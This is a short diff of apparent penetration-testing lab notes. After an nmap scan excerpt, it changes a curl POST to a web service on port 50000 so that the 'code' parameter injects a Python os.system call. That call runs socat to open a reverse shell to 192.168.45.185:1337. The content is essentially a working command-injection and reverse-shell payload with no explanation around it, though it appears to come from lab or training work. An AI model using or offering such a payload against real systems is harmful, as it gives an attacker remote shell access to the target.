@@ -276,7 +276,7 @@ sudo nmap -sC -sV -Pn -p- 192.168.207.117 -oN 207.117_allport
 |_http-title: Site doesn't have a title (text/html; charset=utf-8).
 
 # web 50000 post
-curl -X POST --data "code=code" http://192.168.121.36:50000/verify
+curl -X POST --data "code=os.system('socat TCP:192.168.45.185:1337 EXEC:sh')" http://192.168.121.36:50000/verify
 
 
 
